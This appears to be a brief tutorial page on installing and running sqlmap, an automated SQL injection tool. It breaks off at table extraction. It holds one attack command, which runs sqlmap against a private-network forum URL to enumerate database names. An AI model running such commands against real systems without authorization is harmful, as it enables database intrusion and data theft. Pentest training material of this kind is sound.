# SQL Map 

Url: http://sqlmap.org/

*Install and Download*

You can download the latest zipball or tarball.
Preferably, you can download sqlmap by cloning the Git repository:
```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

## Basic Command

To get a list of basic options and switches use:
```
python sqlmap.py -h
```
To get a list of all options and switches use:
```
python sqlmap.py -hh
```

### Use SQL for SQL Injection

Extract the database:

Attack the given URL (-u “http://192.168.1.250/?p=1&forumaction=search”) and extract the database names (–dbs):
```
root@kali:~# sqlmap -u "http://192.168.1.250/?p=1&forumaction=search" --dbs

    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
    http://sqlmap.org
```
Extract the tables:


